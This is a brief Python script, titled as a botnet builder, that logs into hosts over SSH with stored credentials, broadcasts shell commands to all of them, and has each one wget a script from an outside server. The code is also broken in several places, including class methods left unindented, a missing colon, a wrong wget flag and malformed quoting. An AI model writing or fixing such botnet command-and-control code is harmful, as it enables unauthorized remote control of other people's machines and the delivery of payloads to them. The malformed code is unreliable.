from pexpect import pxssh

## Script to Create a Bot Net 

class Bot: 


    # Initilize New client 

def __init__(self, host, user, password):
    self.host = host 
    self.user = user 
    self.password = password 
    self.session = self.ssh()


    # secure shell into client 

def ssh(self):
    try:
        bot = pxssh.pxssh()
        bot.login(self.host, self.user, self.password)
        return bot 
    except Exception as e: 
        print('Connection Failure.')
        print(e)



    # Send commands to Client 

def send_command(self, cmd)
    self.session.sendline(cmd)
    self.session.prompt()
    return self.session.before

# Friday, Aug 18th

#send Command to all bots in the Network 

def command_bots(command):
    for bot in botnet:
        attack = bot.send_command(command)
        print('Output from' + bot.host)
        print(attack)
        

#  list of bots in the network

botnet=[]


#Add new  bots 

def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)
    
add_bot('', '', '')


#list users home directory
command_bots('ls')

#download script files 

command_bots(""""wget -0 /Users/Owner/Desktop/ "http://c7server.com/script.py"""")


